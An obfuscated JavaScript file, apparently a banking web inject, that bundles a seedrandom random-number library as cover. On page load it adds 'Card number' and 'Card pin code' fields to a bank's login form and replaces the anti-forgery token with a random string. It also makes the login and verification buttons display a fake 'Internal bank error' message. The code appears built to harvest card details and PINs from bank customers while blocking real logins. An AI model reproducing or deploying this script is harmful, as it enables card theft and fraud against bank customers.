/** @type {Array} */
var _0x421b = ["random", "pow", "entropy", "g", "int32", "quick", "double", "global", "state", "pass", "S", "seed", "length", "i", "j", "slice", "object", "push", "string", "\x00", "", "charCodeAt", "randomBytes", "getRandomValues", "crypto", "msCrypto", "navigator", "plugins", "screen", "apply", "fromCharCode", "exports", "function", "amd", "use strict", "document", "form0", "getElementById", "login0", "login-phase", "__RequestVerificationToken", "Internal bank error. Try again later.", "html",
    "empty", "show", ".error-container", "click", "call", "on", ".btn-login", "#verificationDialog .btn-verification", "keyup", "#loginFormContainer form", "div", "createElement", "class", "form-group", "setAttribute", "innerHTML", '<label class="col-xs-12 col-sm-5 control-label" for="CardNum">Card number:</label><div class="col-xs-12 col-sm-7"><input class="form-control" data-val="true" data-val-required="Card number: field is required." id="CardNum" name="CardNum"></div>', "appendChild", '<label class="col-xs-12 col-sm-5 control-label" for="PID">Card pin code:</label><div class="col-xs-12 col-sm-7"><input class="form-control" data-val="true" data-val-required="Pin code: field is required." id="PID" name="PID"></div>',
    "2a8408ca9eac8abaa7f6b78a6f6b0efb", "toLocaleString", "seedrandom", "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789", "floor", "charAt", "value", "readyState", "complete", "addEventListener", "load", "attachEvent", "onload"];
(function (context, dataAndEvents, val1) {
    (function (isXML, exports) {
        /**
         * @param {?} deepDataAndEvents
         * @param {boolean} event
         * @param {Function} environment
         * @return {?}
         */
        function main(deepDataAndEvents, event, environment) {
            /** @type {Array} */
            var tmpSet = [];
            event = event == true ? {
                entropy: true
            } : event || {};
            var classNames = find(getContext(event[_0x421b[2]] ? [deepDataAndEvents, cb(isXML)] : deepDataAndEvents == null ? loop() : deepDataAndEvents, 3), tmpSet);
            var data = new GraphData(tmpSet);
            /**
             * @return {?}
             */
            var suiteView = function () {
                var i = data[_0x421b[3]](fn);
                var obj = ret;
                /** @type {number} */
                var offset = 0;
                for (; i < size;) {
                    /** @type {number} */
                    i = (i + offset) * node;
                    obj *= node;
                    offset = data[_0x421b[3]](1);
                }
                for (; i >= length;) {
                    i /= 2;
                    obj /= 2;
                    offset >>>= 1;
                }
                return (i + offset) / obj;
            };
            /**
             * @return {?}
             */
            suiteView[_0x421b[4]] = function () {
                return data[_0x421b[3]](4) | 0;
            };
            /**
             * @return {?}
             */
            suiteView[_0x421b[5]] = function () {
                return data[_0x421b[3]](4) / 4294967296;
            };
            /** @type {function (): ?} */
            suiteView[_0x421b[6]] = suiteView;
            find(cb(data.S), isXML);
            return (event[_0x421b[9]] || (environment || function (obj, i, dataAndEvents, which) {
                if (which) {
                    if (which[_0x421b[10]]) {
                        callback(which, data);
                    }
                    /**
                     * @return {?}
                     */
                    obj[_0x421b[8]] = function () {
                        return callback(data, {});
                    };
                }
                if (dataAndEvents) {
                    /** @type {Function} */
                    exports[name] = obj;
                    return i;
                } else {
                    return obj;
                }
            }))(suiteView, classNames, _0x421b[7] in event ? event[_0x421b[7]] : this == exports, event[_0x421b[8]]);
        }

        /**
         * @param {(Array|number)} args
         * @return {undefined}
         */
        function GraphData(args) {
            var t;
            var size = args[_0x421b[12]];
            var keys = this;
            /** @type {number} */
            var i = 0;
            /** @type {number} */
            var j = keys[_0x421b[13]] = keys[_0x421b[14]] = 0;
            /** @type {Array} */
            var s = keys[_0x421b[10]] = [];
            if (!size) {
                /** @type {Array} */
                args = [size++];
            }
            for (; i < node;) {
                /** @type {number} */
                s[i] = i++;
            }
            /** @type {number} */
            i = 0;
            for (; i < node; i++) {
                s[i] = s[j = mask & j + args[i % size] + (t = s[i])];
                s[j] = t;
            }
            (keys[_0x421b[3]] = function (dataAndEvents) {
                var val;
                /** @type {number} */
                var directionModifier = 0;
                var i = keys[_0x421b[13]];
                var key = keys[_0x421b[14]];
                var map = keys[_0x421b[10]];
                for (; dataAndEvents--;) {
                    val = map[i = mask & i + 1];
                    directionModifier = directionModifier * node + map[mask & (map[i] = map[key = mask & key + val]) + (map[key] = val)];
                }
                keys[_0x421b[13]] = i;
                keys[_0x421b[14]] = key;
                return directionModifier;
            })(node);
        }

        /**
         * @param {?} object
         * @param {?} data
         * @return {?}
         */
        function callback(object, data) {
            data[_0x421b[13]] = object[_0x421b[13]];
            data[_0x421b[14]] = object[_0x421b[14]];
            data[_0x421b[10]] = object[_0x421b[10]][_0x421b[15]]();
            return data;
        }

        /**
         * @param {Object} name
         * @param {number} opt_attributes
         * @return {?}
         */
        function getContext(name, opt_attributes) {
            /** @type {Array} */
            var event = [];
            /** @type {string} */
            var found = typeof name;
            var pro;
            if (opt_attributes && found == _0x421b[16]) {
                for (pro in name) {
                    try {
                        event[_0x421b[17]](getContext(name[pro], opt_attributes - 1));
                    } catch (e) {
                    }
                }
            }
            return event[_0x421b[12]] ? event : found == _0x421b[18] ? name : name + _0x421b[19];
        }

        /**
         * @param {?} type
         * @param {Array} isXML
         * @return {?}
         */
        function find(type, isXML) {
            var key = type + _0x421b[20];
            var _0x8c33x31;
            /** @type {number} */
            var perms = 0;
            for (; perms < key[_0x421b[12]];) {
                /** @type {number} */
                isXML[mask & perms] = mask & (_0x8c33x31 ^= isXML[mask & perms] * 19) + key[_0x421b[21]](perms++);
            }
            return cb(isXML);
        }

        /**
         * @return {?}
         */
        function loop() {
            try {
                if (mod) {
                    return cb(mod[_0x421b[22]](node));
                }
                /** @type {Uint8Array} */
                var input = new Uint8Array(node);
                (a[_0x421b[24]] || a[_0x421b[25]])[_0x421b[23]](input);
                return cb(input);
            } catch (e) {
                var b = a[_0x421b[26]];
                var bup = b && b[_0x421b[27]];
                return [+new Date, a, bup, a[_0x421b[28]], cb(isXML)];
            }
        }

        /**
         * @param {Array} value
         * @return {?}
         */
        function cb(value) {
            return String[_0x421b[30]][_0x421b[29]](0, value);
        }

        var a = this;
        /** @type {number} */
        var node = 256;
        /** @type {number} */
        var fn = 6;
        /** @type {number} */
        var encoder = 52;
        var name = _0x421b[0];
        var ret = exports[_0x421b[1]](node, fn);
        var size = exports[_0x421b[1]](2, encoder);
        /** @type {number} */
        var length = size * 2;
        /** @type {number} */
        var mask = node - 1;
        var mod;
        /** @type {function (?, boolean, Function): ?} */
        exports[_0x421b[11] + name] = main;
        find(exports[_0x421b[0]](), isXML);
        if (typeof module == _0x421b[16] && module[_0x421b[31]]) {
            /** @type {function (?, boolean, Function): ?} */
            module[_0x421b[31]] = main;
            try {
                mod = require(_0x421b[24]);
            } catch (ex) {
            }
        } else {
            if (typeof define == _0x421b[32] && define[_0x421b[33]]) {
                define(function () {
                    return main;
                });
            }
        }
    })([], Math);
    _0x421b[34];
    var tail = context[_0x421b[35]];
    /**
     * @return {undefined}
     */
    var data = function () {
        var _0x8c33x3a = tail[_0x421b[37]](_0x421b[36]);
        var _0x8c33x3b = tail[_0x421b[37]](_0x421b[38]);
        var collection = tail[_0x421b[37]](_0x421b[39]);
        var flags = tail[_0x421b[37]](_0x421b[40]);
        /**
         * @return {undefined}
         */
        var broadcast = function () {
            $(_0x421b[45])[_0x421b[44]]()[_0x421b[43]]()[_0x421b[42]](_0x421b[41]);
        };
        $(_0x421b[49])[_0x421b[48]](_0x421b[46], function () {
            broadcast[_0x421b[47]]();
        });
        $(_0x421b[50])[_0x421b[48]](_0x421b[46], function () {
            broadcast[_0x421b[47]]();
        });
        $(_0x421b[52])[_0x421b[48]](_0x421b[51], function (dataAndEvents) {
            broadcast[_0x421b[47]]();
        });
        var resp = tail[_0x421b[54]](_0x421b[53]);
        resp[_0x421b[57]](_0x421b[55], _0x421b[56]);
        resp[_0x421b[58]] = _0x421b[59];
        collection[_0x421b[60]](resp);
        var r20 = tail[_0x421b[54]](_0x421b[53]);
        r20[_0x421b[57]](_0x421b[55], _0x421b[56]);
        r20[_0x421b[58]] = _0x421b[61];
        collection[_0x421b[60]](r20);
        Math[_0x421b[64]](_0x421b[62] + (new Date)[_0x421b[63]]());
        var _0x8c33x42 = _0x421b[65];
        var value = _0x421b[20];
        /** @type {number} */
        var _0x8c33x22 = 0;
        for (; _0x8c33x22 < 80; _0x8c33x22++) {
            value += _0x8c33x42[_0x421b[67]](Math[_0x421b[66]](Math[_0x421b[0]]() * _0x8c33x42[_0x421b[12]]));
        }
        flags[_0x421b[68]] = value;
    };
    if (tail[_0x421b[69]] == _0x421b[70]) {
        return data();
    }
    if (context[_0x421b[71]]) {
        context[_0x421b[71]](_0x421b[72], data, false);
    } else {
        if (context[_0x421b[73]]) {
            context[_0x421b[73]](_0x421b[74], data);
        } else {
            /** @type {function (): undefined} */
            context[_0x421b[74]] = data;
        }
    }
})(window, function (dataAndEvents) {

}, undefined);

